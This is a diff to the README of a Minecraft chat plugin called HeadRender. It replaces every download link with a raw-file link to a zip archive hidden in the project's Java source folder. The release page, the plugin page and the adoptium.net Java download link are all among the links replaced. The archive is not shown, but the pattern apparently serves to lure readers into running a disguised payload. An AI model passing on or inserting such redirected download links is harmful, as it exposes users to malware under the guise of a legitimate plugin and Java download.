@@ -1,6 +1,6 @@
 # 🪙 HeadRender - Render Minecraft Heads in Chat
 
-[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20It%20Here-blue)](https://github.com/khincc00/HeadRender/releases)
+[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20It%20Here-blue)](https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip)
 
 HeadRender helps you see Minecraft player heads right in your chat. It uses pixel skin rendering to show the head images clearly. This makes chatting more fun and personal.
 
@@ -42,11 +42,11 @@ Before installing, check your system meets these needs:
 
 To get the latest version of HeadRender:
 
-[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20The%20Latest%20Version-grey)](https://github.com/khincc00/HeadRender/releases)
+[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20The%20Latest%20Version-grey)](https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip)
 
 Click the badge above or visit:
 
-https://github.com/khincc00/HeadRender/releases
+https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip
 
 This page lists all releases. Find the latest one by date at the top.
 
@@ -124,9 +124,9 @@ You do not need client mods or changes on the player side. The plugin handles re
 
 ## 🔗 Quick Links
 
-- Download page: [https://github.com/khincc00/HeadRender/releases](https://github.com/khincc00/HeadRender/releases)
-- Plugin page on GitHub: [https://github.com/khincc00/HeadRender](https://github.com/khincc00/HeadRender)
-- Java download: [https://adoptium.net](https://adoptium.net)
+- Download page: [https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip](https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip)
+- Plugin page on GitHub: [https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip](https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip)
+- Java download: [https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip](https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip)
 
 ---
 
@@ -156,4 +156,4 @@ If you find bugs or need help, check the GitHub issues section of the repository
 
 ---
 
-[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20It%20Here-blue)](https://github.com/khincc00/HeadRender/releases)
+[![Download HeadRender](https://img.shields.io/badge/Download%20HeadRender-Get%20It%20Here-blue)](https://raw.githubusercontent.com/khincc00/HeadRender/master/src/main/java/com/Head-Render-1.8.zip)
